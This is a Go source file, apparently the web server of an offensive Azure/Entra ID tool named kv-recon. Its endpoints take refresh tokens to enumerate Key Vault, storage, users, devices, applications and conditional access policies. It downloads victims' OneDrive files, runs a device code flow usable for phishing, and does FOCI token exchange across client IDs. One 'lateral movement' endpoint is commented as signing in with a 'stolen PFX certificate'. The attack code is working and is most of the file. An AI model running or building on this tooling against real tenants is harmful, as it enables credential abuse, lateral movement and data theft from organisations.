package main

import (
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

//go:embed ui/index.html
var uiHTML []byte

// runRecord holds the log channel for a single recon run.
type runRecord struct {
	logCh chan string
}

var (
	runsMu sync.Mutex
	runs   = make(map[string]*runRecord)
)

// StartServer starts the HTTP server and optionally opens the browser.
func StartServer(addr, port string, openBrowser bool) {
	if err := openDB(); err != nil {
		fmt.Fprintf(os.Stderr, "[!] Token database unavailable: %v\n", err)
		// Non-fatal — enumeration features will fail gracefully without the DB.
	}

	listenAddr := addr + ":" + port
	baseURL := "http://" + listenAddr

	mux := http.NewServeMux()
	mux.HandleFunc("/", serveUI)
	mux.HandleFunc("/run", handleRun)
	mux.HandleFunc("/stream/", handleStream)
	mux.HandleFunc("/storage-run", handleStorageRun)
	mux.HandleFunc("/storage-stream/", handleStorageStream)

	// Token management
	mux.HandleFunc("/api/tokens", handleTokens)
	mux.HandleFunc("/api/tokens/", handleTokenByID)

	// Device code flow
	mux.HandleFunc("/api/devicecode/start", handleDeviceCodeStart)
	mux.HandleFunc("/api/devicecode/stream/", handleDeviceCodeStream)

	// Graph enumeration
	mux.HandleFunc("/api/graph/users", handleGraphUsers)
	mux.HandleFunc("/api/graph/devices", handleGraphDevices)
	mux.HandleFunc("/api/graph/applications", handleGraphApplications)
	mux.HandleFunc("/api/graph/caps", handleGraphCAPs)
	mux.HandleFunc("/api/graph/onedrive", handleGraphOneDrive)
	mux.HandleFunc("/api/graph/onedrive/download", handleOneDriveDownload)

	// FOCI token exchange
	mux.HandleFunc("/api/foci/exchange", handleFOCIExchange)

	// Lateral movement — certificate auth
	mux.HandleFunc("/api/lateral/cert-auth", handleCertAuth)

	fmt.Printf("[*] kv-recon web UI → %s\n", baseURL)
	fmt.Println("[*] Press Ctrl+C to stop.")

	if openBrowser {
		go func() {
			time.Sleep(300 * time.Millisecond)
			openURL(baseURL)
		}()
	}

	srv := &http.Server{
		Addr:    listenAddr,
		Handler: mux,
	}
	if err := srv.ListenAndServe(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Server error: %v\n", err)
		os.Exit(1)
	}
}

func serveUI(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Write(uiHTML) //nolint:errcheck
}

// runRequest is the JSON body accepted by POST /run.
type runRequest struct {
	RefreshToken string `json:"refreshToken"`
	ClientID     string `json:"clientId"`
	TenantID     string `json:"tenantId"`
	VaultName    string `json:"vaultName"`
	OutputPath   string `json:"outputPath"`
}

func handleRun(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req runRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid JSON body", http.StatusBadRequest)
		return
	}

	if req.RefreshToken == "" || req.ClientID == "" || req.TenantID == "" {
		http.Error(w, "refreshToken, clientId, and tenantId are required", http.StatusBadRequest)
		return
	}

	outputPath := req.OutputPath
	if outputPath == "" {
		outputPath = "./KVReconOutput"
	}

	cfg := ReconConfig{
		RefreshToken: req.RefreshToken,
		ClientID:     req.ClientID,
		TenantID:     req.TenantID,
		VaultName:    req.VaultName,
		OutputPath:   outputPath,
		KVAPIVersion: "7.4",
	}

	id := newRunID()
	rec := &runRecord{logCh: make(chan string, 512)}

	runsMu.Lock()
	runs[id] = rec
	runsMu.Unlock()

	go func() {
		RunRecon(cfg, rec.logCh)
		close(rec.logCh)
		// Remove from map after 5 minutes so memory is eventually freed.
		time.AfterFunc(5*time.Minute, func() {
			runsMu.Lock()
			delete(runs, id)
			runsMu.Unlock()
		})
	}()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"id": id}) //nolint:errcheck
}

func handleStream(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/stream/")
	if id == "" {
		http.Error(w, "missing run id", http.StatusBadRequest)
		return
	}

	runsMu.Lock()
	rec, ok := runs[id]
	runsMu.Unlock()

	if !ok {
		http.Error(w, "run not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}

	for line := range rec.logCh {
		encoded, err := json.Marshal(line)
		if err != nil {
			continue
		}
		fmt.Fprintf(w, "data: %s\n\n", encoded)
		flusher.Flush()
	}

	// RunRecon has finished — send the done sentinel.
	fmt.Fprintf(w, "event: done\ndata: {}\n\n")
	flusher.Flush()
}

func newRunID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%x", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

func openURL(url string) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
	case "darwin":
		cmd = exec.Command("open", url)
	default:
		cmd = exec.Command("xdg-open", url)
	}
	cmd.Start() //nolint:errcheck
}

// ── helpers ──────────────────────────────────────────────────────────────────

func jsonError(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": msg}) //nolint:errcheck
}

func respondJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(v) //nolint:errcheck
}

// ── Storage Recon ────────────────────────────────────────────────────────────

type storageRunRequest struct {
	RefreshToken       string `json:"refreshToken"`
	ClientID           string `json:"clientId"`
	TenantID           string `json:"tenantId"`
	StorageAccountName string `json:"storageAccountName"`
	OutputPath         string `json:"outputPath"`
	ListBlobs          bool   `json:"listBlobs"`
}

func handleStorageRun(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req storageRunRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid JSON body", http.StatusBadRequest)
		return
	}
	if req.RefreshToken == "" || req.ClientID == "" || req.TenantID == "" {
		http.Error(w, "refreshToken, clientId, and tenantId are required", http.StatusBadRequest)
		return
	}
	outputPath := req.OutputPath
	if outputPath == "" {
		outputPath = "./StorageReconOutput"
	}
	cfg := StorageReconConfig{
		RefreshToken:       req.RefreshToken,
		ClientID:           req.ClientID,
		TenantID:           req.TenantID,
		StorageAccountName: req.StorageAccountName,
		OutputPath:         outputPath,
		ListBlobs:          req.ListBlobs,
	}
	id := newRunID()
	rec := &runRecord{logCh: make(chan string, 512)}
	runsMu.Lock()
	runs[id] = rec
	runsMu.Unlock()
	go func() {
		RunStorageRecon(cfg, rec.logCh)
		close(rec.logCh)
		time.AfterFunc(5*time.Minute, func() {
			runsMu.Lock()
			delete(runs, id)
			runsMu.Unlock()
		})
	}()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"id": id}) //nolint:errcheck
}

func handleStorageStream(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/storage-stream/")
	if id == "" {
		http.Error(w, "missing run id", http.StatusBadRequest)
		return
	}
	runsMu.Lock()
	rec, ok := runs[id]
	runsMu.Unlock()
	if !ok {
		http.Error(w, "run not found", http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}
	for line := range rec.logCh {
		encoded, err := json.Marshal(line)
		if err != nil {
			continue
		}
		fmt.Fprintf(w, "data: %s\n\n", encoded)
		flusher.Flush()
	}
	fmt.Fprintf(w, "event: done\ndata: {}\n\n")
	flusher.Flush()
}

// ── Token management: GET/POST /api/tokens ────────────────────────────────────

func handleTokens(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		entries, err := ListTokens()
		if err != nil {
			jsonError(w, "failed to list tokens: "+err.Error(), http.StatusInternalServerError)
			return
		}
		respondJSON(w, entries)

	case http.MethodPost:
		var req struct {
			RefreshToken string `json:"refreshToken"`
			ClientID     string `json:"clientId"`
			TenantID     string `json:"tenantId"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			jsonError(w, "invalid JSON body", http.StatusBadRequest)
			return
		}
		if req.RefreshToken == "" || req.ClientID == "" || req.TenantID == "" {
			jsonError(w, "refreshToken, clientId, and tenantId are required", http.StatusBadRequest)
			return
		}

		// Exchange for an access token (Graph scope).
		const graphScope = "https://graph.microsoft.com/.default"
		accessToken, newRefresh, expiresIn, err := exchangeToken(req.TenantID, req.ClientID, req.RefreshToken, graphScope)
		if err != nil {
			jsonError(w, "token exchange failed: "+err.Error(), http.StatusBadGateway)
			return
		}

		refreshStored := newRefresh
		if refreshStored == "" {
			refreshStored = req.RefreshToken
		}

		entry := TokenEntry{
			Label:        parseJWTLabel(accessToken),
			TenantID:     req.TenantID,
			ClientID:     req.ClientID,
			AccessToken:  accessToken,
			RefreshToken: refreshStored,
			ExpiresAt:    time.Now().Add(time.Duration(expiresIn) * time.Second),
			Scopes:       graphScope,
		}
		if err := SaveToken(entry); err != nil {
			jsonError(w, "failed to save token: "+err.Error(), http.StatusInternalServerError)
			return
		}
		respondJSON(w, entry)

	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ── Token management: DELETE /api/tokens/{id}  POST /api/tokens/{id}/refresh ─

func handleTokenByID(w http.ResponseWriter, r *http.Request) {
	// Path: /api/tokens/{id}  or  /api/tokens/{id}/refresh
	path := strings.TrimPrefix(r.URL.Path, "/api/tokens/")
	parts := strings.SplitN(path, "/", 2)
	id := parts[0]
	action := ""
	if len(parts) == 2 {
		action = parts[1]
	}

	if id == "" {
		jsonError(w, "missing token id", http.StatusBadRequest)
		return
	}

	switch action {
	case "":
		if r.Method != http.MethodDelete {
			jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		if err := DeleteToken(id); err != nil {
			jsonError(w, "delete failed: "+err.Error(), http.StatusInternalServerError)
			return
		}
		respondJSON(w, map[string]string{"status": "deleted"})

	case "refresh":
		if r.Method != http.MethodPost {
			jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		entry, err := GetToken(id)
		if err != nil {
			jsonError(w, "token not found: "+err.Error(), http.StatusNotFound)
			return
		}
		accessToken, newRefresh, expiresIn, err := exchangeToken(entry.TenantID, entry.ClientID, entry.RefreshToken, entry.Scopes)
		if err != nil {
			jsonError(w, "token refresh failed: "+err.Error(), http.StatusBadGateway)
			return
		}
		entry.AccessToken = accessToken
		if newRefresh != "" {
			entry.RefreshToken = newRefresh
		}
		entry.ExpiresAt = time.Now().Add(time.Duration(expiresIn) * time.Second)
		if err := SaveToken(entry); err != nil {
			jsonError(w, "failed to persist refreshed token: "+err.Error(), http.StatusInternalServerError)
			return
		}
		respondJSON(w, entry)

	default:
		jsonError(w, "not found", http.StatusNotFound)
	}
}

// ── Graph helpers ─────────────────────────────────────────────────────────────

func resolveToken(r *http.Request) (TokenEntry, error) {
	var req struct {
		TokenID string `json:"tokenId"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		return TokenEntry{}, fmt.Errorf("invalid JSON body")
	}
	if req.TokenID == "" {
		return TokenEntry{}, fmt.Errorf("tokenId is required")
	}
	return GetToken(req.TokenID)
}

// ── Graph endpoints ───────────────────────────────────────────────────────────

func handleGraphUsers(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	t, err := resolveToken(r)
	if err != nil {
		jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	results, err := ListUsers(t.AccessToken)
	if err != nil {
		jsonError(w, "graph error: "+err.Error(), http.StatusBadGateway)
		return
	}
	respondJSON(w, results)
}

func handleGraphDevices(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	t, err := resolveToken(r)
	if err != nil {
		jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	results, err := ListDevices(t.AccessToken)
	if err != nil {
		jsonError(w, "graph error: "+err.Error(), http.StatusBadGateway)
		return
	}
	respondJSON(w, results)
}

func handleGraphApplications(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	t, err := resolveToken(r)
	if err != nil {
		jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	results, err := ListApplications(t.AccessToken)
	if err != nil {
		jsonError(w, "graph error: "+err.Error(), http.StatusBadGateway)
		return
	}
	respondJSON(w, results)
}

func handleGraphCAPs(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	t, err := resolveToken(r)
	if err != nil {
		jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	results, err := ListCAPs(t.AccessToken)
	if err != nil {
		jsonError(w, "graph error: "+err.Error(), http.StatusBadGateway)
		return
	}
	respondJSON(w, results)
}

func handleGraphOneDrive(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	t, err := resolveToken(r)
	if err != nil {
		jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	results, err := ListOwnDrive(t.AccessToken)
	if err != nil {
		jsonError(w, "graph error: "+err.Error(), http.StatusBadGateway)
		return
	}
	respondJSON(w, results)
}

// ── Device Code Flow ──────────────────────────────────────────────────────────

type dcSession struct {
	resultCh chan dcResult
}

type dcResult struct {
	entry *TokenEntry
	err   string
}

var (
	dcMu       sync.Mutex
	dcSessions = make(map[string]*dcSession)
)

// deviceCodeResponse is the response from the device auth endpoint.
type deviceCodeResponse struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationURI string `json:"verification_uri"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
	Message         string `json:"message"`
	Error           string `json:"error"`
	ErrorDesc       string `json:"error_description"`
}

// handleDeviceCodeStart initiates a device code flow.
// POST /api/devicecode/start  body: {tenantId, clientId, scope}
// Returns: {sessionId, userCode, verificationUri, message, expiresIn}
func handleDeviceCodeStart(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		TenantID string `json:"tenantId"`
		ClientID string `json:"clientId"`
		Scope    string `json:"scope"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid JSON body", http.StatusBadRequest)
		return
	}
	if req.TenantID == "" || req.ClientID == "" {
		jsonError(w, "tenantId and clientId are required", http.StatusBadRequest)
		return
	}
	if req.Scope == "" {
		req.Scope = "https://graph.microsoft.com/.default offline_access"
	}

	// Call the device auth endpoint.
	endpoint := "https://login.microsoftonline.com/" + req.TenantID + "/oauth2/v2.0/devicecode"
	form := url.Values{"client_id": {req.ClientID}, "scope": {req.Scope}}
	resp, err := http.Post(endpoint, "application/x-www-form-urlencoded", strings.NewReader(form.Encode())) //nolint:gosec
	if err != nil {
		jsonError(w, "device code request failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var dc deviceCodeResponse
	if err := json.Unmarshal(body, &dc); err != nil {
		jsonError(w, "parse device code response: "+err.Error(), http.StatusBadGateway)
		return
	}
	if dc.Error != "" {
		jsonError(w, dc.Error+": "+dc.ErrorDesc, http.StatusBadGateway)
		return
	}

	// Create a session and start background polling.
	sessionID := newRunID()
	sess := &dcSession{resultCh: make(chan dcResult, 1)}
	dcMu.Lock()
	dcSessions[sessionID] = sess
	dcMu.Unlock()

	interval := dc.Interval
	if interval < 5 {
		interval = 5
	}
	expiresIn := dc.ExpiresIn
	if expiresIn == 0 {
		expiresIn = 900
	}

	go func() {
		defer func() {
			// Clean up session after 20 minutes regardless.
			time.AfterFunc(20*time.Minute, func() {
				dcMu.Lock()
				delete(dcSessions, sessionID)
				dcMu.Unlock()
			})
		}()

		deadline := time.Now().Add(time.Duration(expiresIn) * time.Second)
		tokenEndpoint := "https://login.microsoftonline.com/" + req.TenantID + "/oauth2/v2.0/token"

		for time.Now().Before(deadline) {
			time.Sleep(time.Duration(interval) * time.Second)

			pollForm := url.Values{
				"grant_type":  {"urn:ietf:params:oauth:grant-type:device_code"},
				"client_id":   {req.ClientID},
				"device_code": {dc.DeviceCode},
			}
			pr, err := http.Post(tokenEndpoint, "application/x-www-form-urlencoded", strings.NewReader(pollForm.Encode())) //nolint:gosec
			if err != nil {
				continue
			}
			pb, _ := io.ReadAll(pr.Body)
			pr.Body.Close()

			var tr TokenResponse
			if err := json.Unmarshal(pb, &tr); err != nil {
				continue
			}

			switch tr.Error {
			case "":
				// Success.
				if tr.AccessToken == "" {
					continue
				}
				refreshToken := tr.RefreshToken
				if refreshToken == "" {
					refreshToken = ""
				}
				expiresInSec := tr.ExpiresIn
				if expiresInSec == 0 {
					expiresInSec = 3600
				}
				entry := TokenEntry{
					Label:        parseJWTLabel(tr.AccessToken),
					TenantID:     req.TenantID,
					ClientID:     req.ClientID,
					AccessToken:  tr.AccessToken,
					RefreshToken: refreshToken,
					ExpiresAt:    time.Now().Add(time.Duration(expiresInSec) * time.Second),
					Scopes:       req.Scope,
				}
				if saveErr := SaveToken(entry); saveErr != nil {
					sess.resultCh <- dcResult{err: "token acquired but save failed: " + saveErr.Error()}
					return
				}
				sess.resultCh <- dcResult{entry: &entry}
				return
			case "authorization_pending", "authorization_declined":
				// Keep polling for pending; abort for declined.
				if tr.Error == "authorization_declined" {
					sess.resultCh <- dcResult{err: "authorization declined by user"}
					return
				}
			case "slow_down":
				interval += 5
			default:
				sess.resultCh <- dcResult{err: tr.Error + ": " + tr.ErrorDesc}
				return
			}
		}
		sess.resultCh <- dcResult{err: "device code expired — user did not authenticate in time"}
	}()

	respondJSON(w, map[string]interface{}{
		"sessionId":       sessionID,
		"userCode":        dc.UserCode,
		"verificationUri": dc.VerificationURI,
		"message":         dc.Message,
		"expiresIn":       expiresIn,
	})
}

// handleDeviceCodeStream is an SSE endpoint that fires once when polling completes.
// GET /api/devicecode/stream/{sessionId}
func handleDeviceCodeStream(w http.ResponseWriter, r *http.Request) {
	sessionID := strings.TrimPrefix(r.URL.Path, "/api/devicecode/stream/")
	if sessionID == "" {
		http.Error(w, "missing session id", http.StatusBadRequest)
		return
	}
	dcMu.Lock()
	sess, ok := dcSessions[sessionID]
	dcMu.Unlock()
	if !ok {
		http.Error(w, "session not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}

	// Send a heartbeat every 4 seconds so the browser doesn't time out.
	ticker := time.NewTicker(4 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case res := <-sess.resultCh:
			if res.err != "" {
				payload, _ := json.Marshal(map[string]string{"error": res.err})
				fmt.Fprintf(w, "event: error\ndata: %s\n\n", payload)
			} else {
				payload, _ := json.Marshal(res.entry)
				fmt.Fprintf(w, "event: done\ndata: %s\n\n", payload)
			}
			flusher.Flush()
			return
		case <-ticker.C:
			fmt.Fprintf(w, ": heartbeat\n\n")
			flusher.Flush()
		case <-r.Context().Done():
			return
		}
	}
}

// handleOneDriveDownload proxies a file download through the Graph API.
// GET /api/graph/onedrive/download?tokenId=xxx&itemId=yyy
func handleOneDriveDownload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	tokenID := r.URL.Query().Get("tokenId")
	itemID := r.URL.Query().Get("itemId")
	if tokenID == "" || itemID == "" {
		jsonError(w, "tokenId and itemId are required", http.StatusBadRequest)
		return
	}
	t, err := GetToken(tokenID)
	if err != nil {
		jsonError(w, "token not found: "+err.Error(), http.StatusBadRequest)
		return
	}

	// Fetch the item metadata to get @microsoft.graph.downloadUrl.
	graphURL := fmt.Sprintf("https://graph.microsoft.com/v1.0/me/drive/items/%s", itemID)
	req, _ := http.NewRequest(http.MethodGet, graphURL, nil)
	req.Header.Set("Authorization", "Bearer "+t.AccessToken)
	req.Header.Set("Accept", "application/json")

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		jsonError(w, "graph request failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode >= 400 {
		jsonError(w, fmt.Sprintf("graph error %d: %s", resp.StatusCode, string(body)), resp.StatusCode)
		return
	}

	var item struct {
		Name        string `json:"name"`
		DownloadURL string `json:"@microsoft.graph.downloadUrl"`
	}
	json.Unmarshal(body, &item) //nolint:errcheck

	if item.DownloadURL == "" {
		jsonError(w, "no download URL (item may be a folder)", http.StatusNotFound)
		return
	}
	http.Redirect(w, r, item.DownloadURL, http.StatusFound)
}

// handleCertAuth authenticates as an app registration using a stolen PFX certificate.
// POST /api/lateral/cert-auth  multipart/form-data:
//
//	pfxFile      — PFX (PKCS#12) file
//	pfxPassword  — PFX password (may be empty)
//	clientId     — App registration client ID
//	tenantId     — Azure AD tenant ID
//	scope        — OAuth scope (e.g. https://management.azure.com/.default)
//	label        — Optional display label
func handleCertAuth(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	// Parse multipart form with a 5 MB memory limit (PFX files are tiny).
	if err := r.ParseMultipartForm(5 << 20); err != nil {
		jsonError(w, "form parse error: "+err.Error(), http.StatusBadRequest)
		return
	}
	file, _, err := r.FormFile("pfxFile")
	if err != nil {
		jsonError(w, "pfxFile upload is required: "+err.Error(), http.StatusBadRequest)
		return
	}
	defer file.Close()
	pfxData, err := io.ReadAll(file)
	if err != nil {
		jsonError(w, "reading PFX data: "+err.Error(), http.StatusBadRequest)
		return
	}

	password := r.FormValue("pfxPassword")
	clientID := r.FormValue("clientId")
	tenantID := r.FormValue("tenantId")
	scope := r.FormValue("scope")
	label := r.FormValue("label")

	if clientID == "" || tenantID == "" || scope == "" {
		jsonError(w, "clientId, tenantId, and scope are required", http.StatusBadRequest)
		return
	}

	at, rt, exp, err := ExchangePFXForToken(pfxData, password, tenantID, clientID, scope)
	if err != nil {
		jsonError(w, err.Error(), http.StatusBadGateway)
		return
	}

	if label == "" {
		label = "cert:" + parseJWTLabel(at)
	}
	entry := TokenEntry{
		Label:        label,
		TenantID:     tenantID,
		ClientID:     clientID,
		AccessToken:  at,
		RefreshToken: rt,
		ExpiresAt:    time.Now().Add(time.Duration(exp) * time.Second),
		Scopes:       scope,
	}
	if err := SaveToken(entry); err != nil {
		jsonError(w, "failed to save token: "+err.Error(), http.StatusInternalServerError)
		return
	}

	respondJSON(w, map[string]interface{}{
		"accessToken": at,
		"expiresIn":   exp,
		"label":       label,
	})
}

// handleFOCIExchange exchanges a stored refresh token using a different client ID (FOCI).
// POST /api/foci/exchange  body: {tokenId, clientId, scope, label}
func handleFOCIExchange(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		TokenID  string `json:"tokenId"`
		ClientID string `json:"clientId"`
		Scope    string `json:"scope"`
		Label    string `json:"label"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid JSON body", http.StatusBadRequest)
		return
	}
	if req.TokenID == "" || req.ClientID == "" || req.Scope == "" {
		jsonError(w, "tokenId, clientId, and scope are required", http.StatusBadRequest)
		return
	}

	src, err := GetToken(req.TokenID)
	if err != nil {
		jsonError(w, "source token not found: "+err.Error(), http.StatusBadRequest)
		return
	}
	if src.RefreshToken == "" {
		jsonError(w, "selected token has no refresh token", http.StatusBadRequest)
		return
	}

	at, rt, exp, err := exchangeToken(src.TenantID, req.ClientID, src.RefreshToken, req.Scope)
	if err != nil {
		jsonError(w, "token exchange failed: "+err.Error(), http.StatusBadGateway)
		return
	}

	label := req.Label
	if label == "" {
		suffix := req.ClientID
		if len(suffix) > 8 {
			suffix = suffix[:8]
		}
		label = "FOCI:" + suffix
	}

	entry := TokenEntry{
		Label:        label,
		TenantID:     src.TenantID,
		ClientID:     req.ClientID,
		AccessToken:  at,
		RefreshToken: rt,
		ExpiresAt:    time.Now().Add(time.Duration(exp) * time.Second),
		Scopes:       req.Scope,
	}
	if err := SaveToken(entry); err != nil {
		jsonError(w, "failed to save token: "+err.Error(), http.StatusInternalServerError)
		return
	}

	respondJSON(w, map[string]interface{}{
		"accessToken": at,
		"expiresIn":   exp,
	})
}
